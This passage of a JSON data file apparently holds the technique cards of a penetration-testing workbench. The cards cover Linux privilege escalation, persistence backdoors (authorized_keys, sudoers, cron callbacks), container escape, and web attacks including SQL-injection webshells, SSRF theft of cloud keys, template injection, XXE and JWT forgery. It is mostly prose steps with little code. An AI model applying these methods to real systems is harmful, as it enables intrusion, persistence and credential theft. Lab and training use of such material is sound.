        "Inspect ownership, permissions, and printable strings of the SUID binary to detect GTFOBins upstream applet names, relative command invocations, or custom library paths."
      ],
      "look": [
        "Relative shell commands (service, tar, curl, cp) without leading slashes, or usage banners matching a known GTFOBins utility."
      ],
      "win": "You identify the exact GTFOBins applet or relative-PATH command sink inside the SUID binary.",
      "mistakes": [
        "Executing an unknown custom SUID binary blindly before checking strings and permissions."
      ]
    }
  ],
  "pspy-monitor": [
    {
      "look": [
        "A root process (UID 0) starting on a timer, especially one running a script in a path you can write.",
        "A command line with a password or token in its arguments."
      ],
      "win": "Processes stream past, and a recurring root job reveals its schedule.",
      "mistakes": [
        "Giving up too soon. Some jobs run every few minutes; watch for a cycle."
      ]
    },
    {
      "land": [
        "A quick substitute when you cannot get pspy onto the box. Watch for root processes flickering past."
      ],
      "win": "A root command appears and disappears on a cycle.",
      "mistakes": [
        "Relying on this for very fast jobs; pspy catches what watch misses."
      ]
    }
  ],
  "cron-abuse": [
    {
      "look": [
        "A root job running a script you can write to.",
        "A job whose working directory you control, or that uses a wildcard.",
        "A systemd timer, which crontab does not list."
      ],
      "win": "The scheduled jobs and timers print.",
      "mistakes": [
        "Only reading /etc/crontab. Check cron.d, cron.daily, and systemd timers too."
      ]
    },
    {
      "land": [
        "Append a SUID-bash dropper to the writable root-run script, wait for the schedule, then run /tmp/rootbash -p."
      ],
      "win": "/tmp/rootbash -p gives a root shell after the job fires.",
      "mistakes": [
        "Pointing at a script root does not actually run. Confirm the cron entry uses it."
      ]
    },
    {
      "land": [
        "In the directory the root job tars, create the two option-named files and the script. When root tar runs on *, your checkpoint fires as root."
      ],
      "win": "The planted script runs as root on the next job.",
      "mistakes": [
        "Wrong directory. The files must be where the root job runs tar with a wildcard."
      ]
    },
    {
      "when": "A privileged cron script runs 7z or 7za with a * wildcard inside a writable directory.",
      "land": [
        "Symlink leak.zip to the privileged file you want to read and create an empty @leak.zip trigger file in the same directory."
      ],
      "look": [
        "7-Zip diagnostic warning lines printing each line of the symlinked target file when the cron job runs."
      ],
      "win": "7-Zip parses the symlink target as a @listfile and leaks root secrets or SSH keys into its log output.",
      "mistakes": [
        "Forgetting the matching @ prefix file that instructs 7-Zip to treat the symlink name as a listfile."
      ]
    }
  ],
  "capabilities": [
    {
      "look": [
        "cap_setuid on an interpreter (python, perl), which is an instant root shell.",
        "cap_dac_read_search (read any file, including the shadow hashes), or cap_sys_admin (near-root)."
      ],
      "win": "A capability on a binary prints; one on an interpreter is the lead.",
      "mistakes": [
        "Overlooking capabilities. They do not show as SUID, so a separate getcap is needed."
      ]
    },
    {
      "land": [
        "If python has cap_setuid, this drops a root shell. The note has the perl equivalent."
      ],
      "win": "id shows uid=0.",
      "mistakes": [
        "Using it when python lacks the capability; confirm with getcap first."
      ]
    },
    {
      "land": [
        "If tcpdump has cap_net_raw, capture traffic from the foothold; plaintext credentials fall out."
      ],
      "win": "A capture fills with traffic to read for credentials.",
      "mistakes": [
        "Expecting root. This reads traffic, not a shell; it is a credential source."
      ]
    }
  ],
  "linux-loot-hunt": [
    {
      "look": [
        "A password passed as a command argument in history (mysql -p, curl -u, an ssh with a password).",
        "Paths and other hostnames that hint where to look next."
      ],
      "win": "History files print, and a credential or useful path turns up.",
      "mistakes": [
        "Reading only your own history. Other users history under /home is often readable."
      ]
    },
    {
      "look": [
        "A password or key in a config under /var/www, /opt, /etc, or /srv.",
        "Database connection strings, which carry a password to reuse."
      ],
      "win": "A config line with a secret prints.",
      "mistakes": [
        "A huge unfiltered grep. The pattern and head keep it readable; widen only if needed."
      ]
    },
    {
      "look": [
        "An id_rsa private key (log in as that user), a .kdbx KeePass database, or a .bak backup.",
        "Mail spools and temp directories, classic hiding spots."
      ],
      "win": "A key, a vault, or a backup file is found.",
      "mistakes": [
        "Ignoring a found id_rsa over its permissions; copy it to your box and try it."
      ]
    },
    {
      "when": "From Kali over SSH when you want to sweep shell histories and web/service configs remotely.",
      "land": [
        "Reads accessible .bash_history files and greps /etc, /opt, /var/www, and /srv for password, secret, token, and API key strings."
      ],
      "look": [
        "Cleartext passwords in command history or database/application config files."
      ],
      "win": "A cleartext credential or secret string prints from history or configuration files.",
      "mistakes": [
        "Stopping at the first 50 matches if the output is noisy; narrow the path to the active webroot or service directory."
      ]
    }
  ],
  "linux-persistence": [
    {
      "setup": [
        {
          "label": "Make the key pair on your box first",
          "cmd": "ssh-keygen -t ed25519 -f ./persist -N \"\""
        }
      ],
      "land": [
        "Append your PUBLIC key to root authorized_keys, then log in with the private key."
      ],
      "win": "ssh -i persist root@target logs in with no password.",
      "mistakes": [
        "Pasting the private key by mistake. Only the .pub goes on the target."
      ]
    },
    {
      "land": [
        "Give an account you already control passwordless sudo. It survives a root password change."
      ],
      "win": "sudo -l for that account shows NOPASSWD: ALL.",
      "mistakes": [
        "Being noisy on a short box. Prefer a key; a sudoers edit is easy to spot."
      ]
    },
    {
      "use": [
        "shell-listener"
      ],
      "land": [
        "A cron that calls back to your listener. Louder than a key; use it when SSH is not reachable."
      ],
      "win": "Your listener receives a shell on the schedule.",
      "mistakes": [
        "Leaving it behind after the engagement. Remove persistence when you are done."
      ]
    }
  ],
  "linux-kernel-exploit": [
    {
      "look": [
        "The exact kernel version and distribution. The whole move is matching an exploit to these."
      ],
      "win": "The kernel and distribution print.",
      "mistakes": [
        "Choosing an exploit by name before pinning the exact version; the wrong one crashes the box."
      ]
    },
    {
      "land": [
        "Run the suggester, and start with the ones it marks highly probable."
      ],
      "look": [
        "Public exploits ranked by how well they match your kernel."
      ],
      "win": "A ranked list of candidate escalations prints.",
      "mistakes": [
        "Firing the first result blindly. Read the match confidence and the notes."
      ]
    },
    {
      "land": [
        "Cross-check the suggester against ExploitDB for a known-good proof of concept."
      ],
      "win": "A matching ExploitDB entry is found.",
      "mistakes": [
        "Trusting one source. Confirm the exploit targets your exact version."
      ]
    },
    {
      "land": [
        "Read the source first. Compile on a matching box, then run and confirm uid=0. Snapshot the box if you can; a kernel exploit can panic it."
      ],
      "win": "id shows uid=0 on a box that survived.",
      "mistakes": [
        "Running an unread binary as the first option. A kernel exploit is the last resort for a reason."
      ]
    }
  ],
  "linux-path-hijack": [
    {
      "look": [
        "A custom SUID binary to inspect next (a root cron that calls a helper by name also qualifies)."
      ],
      "win": "The SUID list prints.",
      "mistakes": [
        "Stopping here. The lead is whether that binary calls another program by a bare name."
      ]
    },
    {
      "land": [
        "Confirm the binary calls another program by its bare name, not a full path. That bare name is what you hijack."
      ],
      "look": [
        "A call to a program by name only (such as service or backup), not /usr/bin/something."
      ],
      "win": "strings or ltrace shows a bare-name call.",
      "mistakes": [
        "Hijacking a call that uses an absolute path; PATH does not affect those."
      ]
    },
    {
      "land": [
        "Drop a script with the hijacked name that runs bash -p, make it executable, and put your directory first in PATH."
      ],
      "win": "Your directory is first in PATH and your fake binary is ready.",
      "mistakes": [
        "Forgetting chmod +x, or not putting /tmp first in PATH."
      ]
    },
    {
      "land": [
        "Run the SUID binary; it resolves the bare name to your script and runs it as root."
      ],
      "win": "id shows uid=0.",
      "mistakes": [
        "Running it from a shell where PATH was not exported."
      ]
    }
  ],
  "linux-ld-preload": [
    {
      "look": [
        "env_keep+=LD_PRELOAD (or LD_LIBRARY_PATH) in the sudo policy. That line is the whole vulnerability."
      ],
      "win": "sudo -l shows LD_PRELOAD is preserved.",
      "mistakes": [
        "Missing the env_keep line; without it this does not apply."
      ]
    },
    {
      "land": [
        "Build a small shared library whose constructor sets uid 0 and runs a shell."
      ],
      "win": "The .so is built.",
      "mistakes": [
        "Omitting -nostartfiles, or a constructor that does not exec a shell."
      ]
    },
    {
      "land": [
        "Run any command you are permitted to sudo, with LD_PRELOAD pointing at your library; it loads as root before the command starts."
      ],
      "win": "A root shell opens.",
      "mistakes": [
        "Using a command you are not actually allowed to sudo."
      ]
    },
    {
      "land": [
        "Confirm the shell is uid 0."
      ],
      "win": "id shows uid=0.",
      "mistakes": []
    }
  ],
  "wildcard-injection": [
    {
      "look": [
        "A root job running tar, chown, rsync, or 7z with a * in a directory you can write."
      ],
      "win": "A privileged wildcard command is found (pspy catches ones the cron files do not name).",
      "mistakes": [
        "Only reading cron files; pspy reveals jobs they do not list."
      ]
    },
    {
      "look": [
        "Write permission on the directory the wildcard expands in."
      ],
      "win": "The directory is writable by you.",
      "mistakes": [
        "Targeting a directory you cannot write."
      ]
    },
    {
      "land": [
        "Stage a script that makes a SUID copy of bash."
      ],
      "win": "The script is in place.",
      "mistakes": []
    },
    {
      "land": [
        "Create the two option-named files. The shell hands them to tar as options, and on the next run your script executes as root."
      ],
      "win": "The option-named files sit beside your script.",
      "mistakes": [
        "Wrong tool syntax. tar uses --checkpoint; rsync uses -e; chown uses --reference."
      ]
    },
    {
      "land": [
        "After the job fires, run the SUID bash."
      ],
      "win": "uid=0 confirms root on demand.",
      "mistakes": [
        "Running it before the scheduled job has fired."
      ]
    },
    {
      "when": "When a privileged cron job or script runs 7z or tar with a wildcard (*) in a directory you can write to.",
      "land": [
        "Plant a symlink pointing to the protected file (such as /root/root.txt or /root/.ssh/id_rsa) so the privileged archiver packs or leaks its contents."
      ],
      "look": [
        "The target file contents included in the resulting archive or error output."
      ],
      "win": "The privileged archive job follows or exposes the symlinked root file.",
      "mistakes": [
        "Using a relative symlink target that breaks when the cron job runs from a different working directory."
      ]
    }
  ],
  "systemd-timer-abuse": [
    {
      "look": [
        "A writable .service or .timer file, or a writable script that a unit starts."
      ],
      "win": "A writable unit or target prints.",
      "mistakes": [
        "Assuming all units are root-owned; look for the writable one."
      ]
    },
    {
      "look": [
        "No User= line, which means it runs as root.",
        "The ExecStart target, which is what you control."
      ],
      "win": "The unit shows it runs as root and names its ExecStart.",
      "mistakes": [
        "Editing a unit that runs as a normal user; confirm there is no User= line."
      ]
    },
    {
      "land": [
        "Point ExecStart at a payload that makes a SUID copy of bash."
      ],
      "win": "The unit now runs your payload.",
      "mistakes": [
        "Breaking the unit syntax; keep it to one ExecStart line."
      ]
    },
    {
      "land": [
        "Reload, then start it, or wait for its timer."
      ],
      "win": "uid=0 from /tmp/rb -p confirms root.",
      "mistakes": [
        "Forgetting daemon-reload after editing the unit."
      ]
    }
  ],
  "polkit-abuse": [
    {
      "look": [
        "A setuid pkexec, and a version from before the 2022 fix (PwnKit, CVE-2021-4034)."
      ],
      "win": "pkexec is setuid and its version is pre-fix.",
      "mistakes": [
        "Assuming it is patched. Check the version against the fix."
      ]
    },
    {
      "land": [
        "A public PwnKit proof of concept compiles on the box and drops a root shell. Stage a precompiled binary if there is no compiler."
      ],
      "win": "A root shell opens; id shows uid=0.",
      "mistakes": [
        "Needing a compiler on a box without one; carry a static binary instead."
      ]
    },
    {
      "land": [
        "If pkexec is patched, look for a D-Bus action with a permissive policy (the accounts-daemon race, CVE-2021-3560)."
      ],
      "look": [
        "An accounts or policy D-Bus service that might be raced."
      ],
      "win": "A candidate D-Bus service is listed.",
      "mistakes": []
    },
    {
      "land": [
        "Confirm root, then clean up any user you created."
      ],
      "win": "id shows uid=0.",
      "mistakes": []
    }
  ],
  "python-library-hijack": [
    {
      "look": [
        "A root cron or sudo entry running a .py script."
      ],
      "win": "A root-run Python script is found.",
      "mistakes": []
    },
    {
      "look": [
        "A local (non-standard-library) import you can shadow; note its module name."
      ],
      "win": "The script imports a local module.",
      "mistakes": [
        "Trying to shadow a standard-library module; a local import is far easier."
      ]
    },
    {
      "look": [
        "The script own directory is first on the import path. Is it writable by you?"
      ],
      "win": "The script directory is writable.",
      "mistakes": [
        "Targeting a directory not on the import path."
      ]
    },
    {
      "land": [
        "Plant a module with the imported name; it runs as root on the next run. Then /tmp/rb -p."
      ],
      "win": "uid=0 from the SUID bash after the script runs.",
      "mistakes": [
        "A wrong module name or directory; match the import exactly."
      ]
    },
    {
      "when": "When the imported .py source file is read-only, but the __pycache__ directory is writable.",
      "land": [
        "Compile your payload to a .pyc file matching the exact Python version tag and copy it over the cached bytecode in __pycache__."
      ],
      "look": [
        "Matching size and timestamp header so Python loads your compiled .pyc on the next root execution."
      ],
      "win": "Root executes your trojanized .pyc bytecode from __pycache__.",
      "mistakes": [
        "Mismatched Python minor version tag or header bytes, causing Python to ignore the .pyc and re-read the .py source."
      ]
    }
  ],
  "container-escape": [
    {
      "look": [
        "A docker cgroup line, or /.dockerenv, confirming you are containerized."
      ],
      "win": "You confirm this is a container.",
      "mistakes": [
        "Hunting for root inside the container; the goal is the host node."
      ]
    },
    {
      "look": [
        "CAP_SYS_ADMIN, or a full CapEff mask, meaning the container is effectively privileged."
      ],
      "win": "A privileged capability set prints.",
      "mistakes": [
        "Assuming an unprivileged container; check the caps first."
      ]
    },
    {
      "land": [
        "A mounted docker socket is root on the host by design; bind-mount / and chroot in."
      ],
      "win": "At /host you are root on the node.",
      "mistakes": []
    },
    {
      "land": [
        "A permissive service-account token lets you create a privileged pod that mounts the host."
      ],
      "look": [
        "A yes from can-i create pods."
      ],
      "win": "The token can create pods.",
      "mistakes": [
        "Stopping at a single no; try other verbs and namespaces."
      ]
    }
  ],
  "dirtycow": [
    {
      "look": [
        "A kernel below 4.8.3."
      ],
      "win": "The kernel version prints.",
      "mistakes": [
        "Firing it on a patched kernel; it is unstable and can crash the box."
      ]
    },
    {
      "land": [
        "Compile and run on the target. The /etc/passwd variant then lets you su to the new root user. Snapshot first; it can destabilize the box."
      ],
      "win": "su to the new user gives root.",
      "mistakes": [
        "Using a crash-prone variant on a box you cannot reset."
      ]
    }
  ],
  "dirtypipe": [
    {
      "look": [
        "A kernel in the 5.8 to 5.16.11 range."
      ],
      "win": "The kernel version prints.",
      "mistakes": [
        "Running it outside the affected range."
      ]
    },
    {
      "land": [
        "The exploit backs up and rewrites a SUID binary (su), hands you a root shell, and restores the original."
      ],
      "win": "A root shell opens; id shows uid=0.",
      "mistakes": [
        "Targeting a binary the exploit cannot restore; su is the standard choice."
      ]
    }
  ],
  "baron-samedit": [
    {
      "look": [
        "A sudo version below 1.9.5p2. A sudoedit -s crash test also confirms it."
      ],
      "win": "The sudo version is in the vulnerable range.",
      "mistakes": [
        "Assuming you need sudo rights; this needs none."
      ]
    },
    {
      "land": [
        "Clone the worawit exploit; it auto-detects the offsets for the target."
      ],
      "win": "The exploit is cloned.",
      "mistakes": []
    },
    {
      "land": [
        "Run it; it spawns a root shell with no sudo rights required."
      ],
      "win": "A root shell opens; id shows uid=0.",
      "mistakes": [
        "Expecting it to need sudo access; it does not."
      ]
    }
  ],
  "vhost-discovery": [
    {
      "when": "Once you have a domain name (from a TLS certificate, a redirect, or DNS) and a web port.",
      "look": [
        "A response whose size or status differs from the default-page baseline. That is a real vhost.",
        "Names like dev, staging, test, or admin, which are usually less hardened than production."
      ],
      "win": "One or more Host values return a different page; add them to /etc/hosts.",
      "mistakes": [
        "Not baselining the default size with -fs first, so every response looks like a hit."
      ]
    },
    {
      "when": "As an alternative when ffuf is noisy or you prefer wfuzz.",
      "look": [
        "A hit that differs from a bogus-Host baseline (here measured by character count, not bytes)."
      ],
      "win": "wfuzz lists the vhosts that differ from the baseline.",
      "mistakes": [
        "Hiding by the wrong unit. --hh is character count; baseline a fake Host value first."
      ]
    }
  ],
  "content-discovery": [
    {
      "when": "The first thing to do against any web port, right after the version scan.",
      "look": [
        ".git, .svn, or backup extensions (.bak, .old, .zip), which leak source and secrets.",
        "/admin, /api, /uploads, and anything that takes input.",
        "A 401 or 403, which means the path exists but is protected, a lead, not a dead end."
      ],
      "win": "A map of real paths prints, with the interesting ones to chase.",
      "mistakes": [
        "Stopping at 200s. A 403 is a found path worth probing (see verb tampering)."
      ]
    },
    {
      "when": "A lighter, faster sweep, with JSON output.",
      "look": [
        "The same leads: admin, api, uploads, and source or backup files."
      ],
      "win": "A list of discovered paths prints as JSON.",
      "mistakes": [
        "Using too small a wordlist and missing the one path that mattered."
      ]
    },
    {
      "when": "The long-standing alternative, with extension fuzzing built in.",
      "look": [
        "Paths with the appended extensions (php, bak, txt), which catch backup and source files."
      ],
      "win": "Paths and files with those extensions print.",
      "mistakes": [
        "Forgetting -k on a self-signed TLS cert, so HTTPS targets error out."
      ]
    },
    {
      "when": "When standard wordlists fail to crack a hash or login and the site has rich custom text (bios, team pages, blog posts).",
      "land": [
        "Crawls the web application to depth 2 and extracts target-specific words into cewl.txt for password spraying or hash cracking."
      ],
      "look": [
        "Company names, project codenames, and unusual proper nouns written into cewl.txt."
      ],
      "win": "A custom target wordlist is generated in cewl.txt.",
      "mistakes": [
        "Setting minimum word length too high and missing short custom passwords."
      ]
    },
    {
      "when": "When you have multiple web ports or vhosts and want a quick visual triage of every page.",
      "land": [
        "Captures a headless browser screenshot and response headers into an HTML report folder."
      ],
      "look": [
        "Login portals, default admin dashboards, and version banners visible in the rendered page."
      ],
      "win": "Visual screenshots and headers are saved to eyewitness_report.",
      "mistakes": []
    }
  ],
  "web-access-blocked": [
    {
      "when": "When a scan returns 429s or suddenly all errors: a rate limit or WAF is throttling you.",
      "land": [
        "Drop the thread count, add a small delay, and send a real User-Agent. A slow scan that finishes beats a fast one that gets you blocked."
      ],
      "win": "The scan runs steadily again without 429s.",
      "mistakes": [
        "Cranking threads higher to go faster, which trips the limit harder."
      ]
    },
    {
      "when": "When the handshake fails with a TLS or version error.",
      "land": [
        "You spoke TLS to a plaintext port, or the reverse. Flip the scheme, and add -k for a self-signed cert."
      ],
      "win": "The page loads once the scheme matches the port.",
      "mistakes": [
        "Blaming the app when it is just http versus https."
      ]
    },
    {
      "when": "When the fuzzer refuses to run because every path returns 200 (a catch-all or soft 404).",
      "land": [
        "Measure the decoy response and filter it out by size or words, or blacklist its status code; real paths then stand out."
      ],
      "win": "Genuine paths reappear once the catch-all is filtered.",
      "mistakes": [
        "Trusting a 200 on a wildcard host; baseline a random path first."
      ]
    }
  ],
  "param-discovery": [
    {
      "when": "Against a specific handler once content discovery has found one (for example /search).",
      "look": [
        "An accepted parameter name that does not appear in the pages HTML. The hidden one is often the vulnerable one."
      ],
      "win": "arjun reports one or more accepted parameter names.",
      "mistakes": [
        "Fuzzing the site root instead of a real handler; point -u at the endpoint."
      ]
    },
    {
      "when": "A wider sweep when the default parameter set finds nothing.",
      "look": [
        "A debug, file, or redirect parameter surfacing from the larger wordlist."
      ],
      "win": "A parameter the smaller list missed is found.",
      "mistakes": [
        "Giving up after the default run; the bigger list often finds the leftover switch."
      ]
    }
  ],
  "lfi-probe": [
    {
      "when": "The moment a parameter names a file to load (page=, file=, include=).",
      "look": [
        "root:x:0:0 in the response, which proves the file read worked."
      ],
      "win": "The contents of /etc/passwd come back in the response.",
      "mistakes": [
        "Giving up after one ../ depth; try more levels and the evasions below."
      ]
    },
    {
      "when": "When the plain traversal is filtered.",
      "look": [
        "/etc/passwd returning even though the simple ../ was stripped, which means nesting defeated the filter."
      ],
      "win": "The file read succeeds through the nested sequence.",
      "mistakes": [
        "Assuming it is patched after one failed attempt; filters are often naive."
      ]
    },
    {
      "when": "To read source code, not just flat files.",
      "look": [
        "A base64 blob you can decode to the pages source, where database and config secrets live."
      ],
      "win": "The decoded output is readable source with credentials in it.",
      "mistakes": [
        "Forgetting to base64-decode the response before reading it."
      ]
    }
  ],
  "file-upload": [
    {
      "when": "The moment the app exposes anything that takes a file.",
      "land": [
        "First send a harmless file and read the response for where it landed (the path you will request later)."
      ],
      "look": [
        "A success message, and any path or filename the response reveals."
      ],
      "win": "The benign file uploads and you learn where it went.",
      "mistakes": [
        "Jumping straight to a shell before you know the upload works and where files land."
      ]
    },
    {
      "when": "After the harmless file proves the upload works.",
      "look": [
        "Whether the straightforward upload is accepted or refused (the note lists the bypasses to try: a double extension, .phtml, a fake image Content-Type)."
      ],
      "win": "A server-side script is accepted past the filter.",
      "mistakes": [
        "Only trying one extension; filters vary, so work through the bypass list."
      ]
    },
    {
      "when": "To confirm the upload runs before doing anything bigger.",
      "look": [
        "The command output (uid, or the Windows whoami) in the response, which is code execution."
      ],
      "win": "The uploaded script runs a command and returns its output.",
      "mistakes": [
        "Assuming it runs because it uploaded. Request it and confirm first."
      ]
    }
  ],
  "sqli-basics": [
    {
      "when": "On any parameter that looks like it reaches a database (id=, category=, search=).",
      "look": [
        "A database error in the response, which is all but a confession of injection."
      ],
      "win": "A single quote triggers a visible SQL error.",
      "mistakes": [
        "Treating a generic 500 as proof; look for an actual SQL error message."
      ]
    },
    {
      "when": "When a quote gives no error, test boolean logic.",
      "look": [
        "The page rendering for 1=1 but changing or breaking for 1=2. That divergence proves boolean injection."
      ],
      "win": "The true and false conditions return clearly different pages.",
      "mistakes": [
        "Not comparing the two responses carefully; the difference can be subtle."
      ]
    },
    {
      "when": "To find how many columns the query returns, before extracting data.",
      "look": [
        "The point at which the UNION error clears, which gives the column count, and which numbers appear on the page (your output columns)."
      ],
      "win": "A column count is established and the reflected positions are known.",
      "mistakes": [
        "Guessing the column count instead of raising it until the error clears."
      ]
    }
  ],
  "manual-sqli-exploitation": [
    {
      "when": "After injection is confirmed, when the exam or the box rules out sqlmap.",
      "land": [
        "Walk it in the Workbench Manual SQLi tab: pick the engine, fill in the column count and visible column as you learn them, and it writes each next payload for you. Exam-legal, because you run every query."
      ],
      "look": [
        "The highest ORDER BY index that still returns. That number is the column count."
      ],
      "win": "The column count is pinned down.",
      "mistakes": [
        "Stopping at the first error without noting the last working index."
      ]
    },
    {
      "look": [
        "Which placeholder numbers are echoed on the page. Those positions carry your extracted data."
      ],
      "win": "The reflected columns are identified.",
      "mistakes": [
        "Putting data in a column that is not reflected, so nothing shows."
      ]
    },
    {
      "look": [
        "The database version, current database, and the account the queries run as. That account privileges decide file read and write."
      ],
      "win": "The backend and the database account are fingerprinted.",
      "mistakes": [
        "Skipping the account check; it decides whether LOAD_FILE and OUTFILE are possible."
      ]
    },
    {
      "look": [
        "The concatenated username and password rows for the whole table in one reflected field."
      ],
      "win": "Every credential row comes back in a single request.",
      "mistakes": [
        "Dumping one row at a time when group_concat returns them all at once."
      ]
    },
    {
      "when": "When nothing is reflected on the page (blind injection).",
      "look": [
        "A delayed response, which infers one true or false bit at a time."
      ],
      "win": "The timing oracle confirms a value character by character.",
      "mistakes": [
        "Expecting output; blind injection is read through timing or boolean behaviour."
      ]
    },
    {
      "when": "When the database account holds the FILE privilege.",
      "look": [
        "File contents returned through the reflected column, which also means INTO OUTFILE can write a webshell into the web root."
      ],
      "win": "An arbitrary file read succeeds; the same privilege writes a shell.",
      "mistakes": [
        "Trying OUTFILE without the FILE privilege, which simply fails."
      ]
    }
  ],
  "sqlmap-automation": [
    {
      "when": "After you have confirmed injection by hand, to automate the dumping.",
      "land": [
        "Save the raw request from Burp or the browser to a file and point -r at it. Raise level and risk only when you must."
      ],
      "win": "sqlmap confirms the injection from your saved request.",
      "mistakes": [
        "Pointing sqlmap at a URL and missing cookies or POST bodies; use the saved request."
      ]
    },
    {
      "land": [
        "Work in stages: list databases, then tables, then dump the one table you want. It keeps your evidence tidy."
      ],
      "win": "The databases and tables list, then the target table dumps.",
      "mistakes": [
        "Dumping everything at once and drowning in output."
      ]
    },
    {
      "when": "When the database account is privileged enough for command execution.",
      "look": [
        "An os-shell prompt, which runs commands through the injection."
      ],
      "win": "sqlmap drops you into an OS shell.",
      "mistakes": [
        "Expecting a shell on a low-privilege database account; check the account first."
      ]
    }
  ],
  "git-exposed": [
    {
      "when": "When content discovery shows a /.git path.",
      "look": [
        "A reply beginning ref: refs/heads/, which confirms the directory is exposed."
      ],
      "win": "The .git HEAD responds, so the repository is downloadable.",
      "mistakes": [
        "Assuming it is there without checking HEAD first."
      ]
    },
    {
      "land": [
        "Rebuild the repository locally with git-dumper; it needs no cooperation from the server."
      ],
      "win": "The full repository, including history, lands in your loot directory.",
      "mistakes": [
        "Trying to browse files one by one instead of dumping the whole repo."
      ]
    },
    {
      "look": [
        "A password, key, or secret in the current files or, more often, in an older commit."
      ],
      "win": "grep or git log -p turns up a credential removed later but kept in history.",
      "mistakes": [
        "Only grepping the current checkout; the secret is usually in an old commit."
      ]
    }
  ],
  "svn-exposed": [
    {
      "when": "When content discovery shows a /.svn path, or port 3690 is open.",
      "look": [
        "entries (or a wc.db) coming back, which means the metadata is exposed."
      ],
      "win": "The .svn metadata responds.",
      "mistakes": [
        "Overlooking svn because you only checked for .git."
      ]
    },
    {
      "land": [
        "Check out the exposed svn service anonymously over port 3690."
      ],
      "win": "The working tree, source and all, checks out locally.",
      "mistakes": [
        "Forgetting svn can also be a network service, not just a web folder."
      ]
    },
    {
      "look": [
        "A deleted secret in the revision history, found the same way git log -p finds one."
      ],
      "win": "The history reveals a credential removed in a later revision.",
      "mistakes": [
        "Reading only HEAD; diff the full revision range."
      ]
    }
  ],
  "ssrf": [
    {
      "when": "On any input that even smells like a URL (a fetch, an import, a webhook, a preview).",
      "look": [
        "localhost content you should not be able to reach, or an inbound hit on your listener. Either proves the primitive."
      ],
      "win": "The server fetches a URL you chose.",
      "mistakes": [
        "Testing only external URLs; the value is reaching internal addresses."
      ]
    },
    {
      "when": "On a cloud-hosted app, to reach the metadata endpoint.",
      "look": [
        "Metadata content, or on EC2 the iam/security-credentials path, which yields AWS keys."
      ],
      "win": "The metadata service responds through the SSRF.",
      "mistakes": [
        "Giving up on IMDSv1 paths; cloud notes differ per provider (AWS, Azure, GCP)."
      ]
    },
    {
      "when": "To map internal services you cannot reach directly.",
      "look": [
        "Shifts in response length as you sweep ports. The internal-only services are the real target."
      ],
      "win": "An internal port responds differently, revealing a hidden service.",
      "mistakes": [
        "Not noting the response-size baseline, so every port looks the same."
      ]
    },
    {
      "when": "When a POST JSON endpoint fetches a user-supplied URL and you want to scan localhost ports through it.",
      "land": [
        "Send one baseline request to note the closed-port response size, then pass that size to -fs so only open internal ports print."
      ],
      "look": [
        "Port numbers returning a different response size, status code, or timing."
      ],
      "win": "ffuf reveals internal-only ports listening on 127.0.0.1.",
      "mistakes": [
        "Forgetting -fs, flooding your terminal with thousands of identical closed-port responses."
      ]
    },
    {
      "when": "When a GET query parameter accepts a URL and you want to sweep localhost ports with auto-calibration.",
      "land": [
        "-ac automatically calibrates baseline filtering so open internal ports stand out immediately."
      ],
      "look": [
        "Hits on internal ports such as 3000, 5000, 6379, 8000, 8080, or 9000."
      ],
      "win": "Hidden loopback services are discovered through the GET SSRF parameter.",
      "mistakes": []
    }
  ],
  "ssti": [
    {
      "when": "On any input that is reflected into a page: a name, a search box, an email or profile field.",
      "look": [
        "A 49 where you sent the 7*7 test, which means the template engine evaluated it.",
        "Other engine markers if 49 does not show (the note lists the variants)."
      ],
      "win": "The arithmetic is evaluated, confirming template injection.",
      "mistakes": [
        "Testing only one engine syntax; different engines use different markers."
      ]
    },
    {
      "when": "On a confirmed Jinja2 target, to read the config.",
      "look": [
        "Config values, often including a SECRET_KEY you can reuse for JWT forgery."
      ],
      "win": "The template config prints, exposing secrets.",
      "mistakes": [
        "Skipping the config read; the SECRET_KEY often unlocks the whole app."
      ]
    },
    {
      "use": [
        "shell-listener"
      ],
      "when": "To turn confirmed injection into command execution.",
      "look": [
        "The command output (uid) in the response, which is code execution."
      ],
      "win": "The engine gadget runs a command and returns its output.",
      "mistakes": [
        "Using the wrong engine gadget; match it to the engine you detected."
      ]
    }
  ],
  "xxe": [
    {
      "when": "On any endpoint that accepts XML, even hidden ones (a SAML login, a .docx, an application/xml API).",
      "look": [
        "root:x:0:0 in the response, which means the external entity resolved and read the file."
      ],
      "win": "The file read returns /etc/passwd.",
      "mistakes": [
        "Assuming an endpoint is not XML; some accept it quietly without advertising it."
      ]
    },
    {
      "when": "Against PHP, to read source.",
      "look": [
        "A base64 blob you decode to the pages source and its secrets."
      ],
      "win": "The source comes back base64-encoded and decodes cleanly.",
      "mistakes": [
        "Reading PHP source without the base64 wrapper, so the parser mangles it."
      ]
    },
    {
      "use": [
        "shell-listener"
      ],
      "when": "When nothing is returned (blind XXE).",
      "look": [
        "An outbound hit on your listener, which proves blind XXE and sets up out-of-band exfiltration."
      ],
      "win": "Your listener receives the request the parser made.",
      "mistakes": [
        "Concluding there is no XXE because the response is empty; watch your listener."
      ]
    }
  ],
  "deserialization": [
    {
      "use": [
        "shell-listener"
      ],
      "when": "When you see serialized markers (Java rO0AB, .NET __VIEWSTATE, PHP O:4:) in a cookie, body, or ViewState.",
      "land": [
        "Build the gadget-chain payload, and verify execution with a pingback to your listener before staging anything larger."
      ],
      "look": [
        "The pingback arriving on your listener, which confirms the chain runs."
      ],
      "win": "Your listener receives the verification ping.",
      "mistakes": [
        "Firing a big payload before a small pingback proves the chain works."
      ]
    },
    {
      "land": [
        "Send the payload through whichever parameter, cookie, or ViewState you identified."
      ],
      "win": "The crafted blob is accepted and deserialized.",
      "mistakes": [
        "Sending it to the wrong field; match it to where the serialized data lives."
      ]
    },
    {
      "look": [
        "A gadget chain that lines up with libraries the app actually uses (named in error messages or /WEB-INF)."
      ],
      "win": "A usable chain for this app stack is identified.",
      "mistakes": [
        "Picking a chain for a library the app does not load."
      ]
    }
  ],
  "jwt-attacks": [
    {
      "when": "Whenever authentication rides in a JWT (a token in a cookie or Authorization header).",
      "land": [
        "Paste the token into the Workbench JWT tab: it decodes the header and payload and flags the attack (alg:none, a weak HMAC secret for hashcat -m 16500, RS256-to-HS256 confusion)."
      ],
      "look": [
        "The role or admin claims in the decoded payload, which are what you will forge."
      ],
      "win": "The token payload decodes and its claims are readable.",
      "mistakes": [
        "Trying to decode the signature; only the payload segment is base64 data."
      ]
    },
    {
      "setup": [
        {
          "label": "Unpack rockyou for the secret crack",
          "cmd": "gunzip -k /usr/share/wordlists/rockyou.txt.gz"
        }
      ],
      "when": "To recover a weak HMAC signing secret offline.",
      "look": [
        "A cracked secret (common ones like secret, key, or the app name fall fast)."
      ],
